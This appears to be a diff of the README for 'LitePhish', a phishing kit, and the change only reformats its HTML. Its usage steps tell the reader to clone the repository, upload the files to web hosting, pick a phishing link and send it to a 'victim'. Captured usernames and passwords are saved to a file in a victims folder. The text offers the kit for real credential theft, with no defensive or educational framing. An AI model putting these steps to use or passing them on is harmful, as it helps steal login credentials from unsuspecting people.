@@ -27,13 +27,11 @@ It is modified and lite version of <a href=http://www.github.com/graysuit/grayfi
 
 
 <h2> Usage</h2>
-<pre><code>
-git clone https://github.com/DarkSecDevelopers/LitePhish.git
-</code></pre>
-<br><p><ol><li>Upload all files to any web hosting you like</li>
+<pre><code>git clone https://github.com/DarkSecDevelopers/LitePhish.git</code></pre>
+<ol><li>Upload all files to any web hosting you like</li>
 <li>Select any phishing link</li>
 <li>Send the link to your victim</li>
-<li><b>Note:</b> Username/Password will saved in victims/password.txt</li></ol></p><br>
+<li><b>Note:</b> Username/Password will saved in victims/password.txt</li></ol>
 
 
 <h2> Available sites</h2>
